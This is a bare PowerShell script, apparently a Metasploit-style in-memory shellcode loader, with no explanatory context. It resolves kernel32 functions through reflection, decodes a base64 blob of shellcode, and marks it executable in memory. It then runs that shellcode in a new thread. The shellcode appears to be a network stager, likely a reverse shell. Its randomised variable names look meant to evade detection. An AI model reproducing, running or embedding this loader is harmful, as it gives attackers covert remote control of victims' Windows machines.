function y1p2 {
        Param ($dI, $mS3Q3)
        $zIPDv = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')

        return $zIPDv.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String])).Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($zIPDv.GetMethod('GetModuleHandle')).Invoke($null, @($dI)))), $mS3Q3))
}

function pInHh {
        Param (
                [Parameter(Position = 0, Mandatory = $True)] [Type[]] $m6,
                [Parameter(Position = 1)] [Type] $dt = [Void]
        )

        $tK = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
        $tK.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $m6).SetImplementationFlags('Runtime, Managed')
        $tK.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $dt, $m6).SetImplementationFlags('Runtime, Managed')

        return $tK.CreateType()
}

[Byte[]]$pK = [System.Convert]::FromBase64String("/OiPAAAAYDHSieVki1Iwi1IMi1IUD7dKJotyKDH/McCsPGF8Aiwgwc8NAcdJde9SV4tSEItCPAHQi0B4hcB0TAHQi0gYUItYIAHThcl0PEmLNIsB1jH/McDBzw2sAcc44HX0A334O30kdeBYi1gkAdNmiwxLi1gcAdOLBIsB0IlEJCRbW2FZWlH/4FhfWosS6YD///9daDMyAABod3MyX1RoTHcmB4no/9C4kAEAACnEVFBoKYBrAP/VagpoCplTk2gCABFbieZQUFBQQFBAUGjqD9/g/9WXahBWV2iZpXRh/9WFwHQK/04IdezoZwAAAGoAagRWV2gC2chf/9WD+AB+Nos2akBoABAAAFZqAGhYpFPl/9WTU2oAVlNXaALZyF//1YP4AH0oWGgAQAAAagBQaAsvDzD/1VdodW5NYf/VXl7/DCQPhXD////pm////wHDKcZ1wcO78LWiVmoAU//V")
[Uint32]$p3KMS = 0
$kEX8i = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((y1p2 kernel32.dll VirtualAlloc), (pInHh @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $pK.Length,0x3000, 0x04)

[System.Runtime.InteropServices.Marshal]::Copy($pK, 0, $kEX8i, $pK.length)
if (([System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((y1p2 kernel32.dll VirtualProtect), (pInHh @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool]))).Invoke($kEX8i, [Uint32]$pK.Length, 0x10, [Ref]$p3KMS)) -eq $true) {
        $iC4 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((y1p2 kernel32.dll CreateThread), (pInHh @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$kEX8i,[IntPtr]::Zero,0,[IntPtr]::Zero)
        [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((y1p2 kernel32.dll WaitForSingleObject), (pInHh @([IntPtr], [Int32]))).Invoke($iC4,0xffffffff) | Out-Null
}
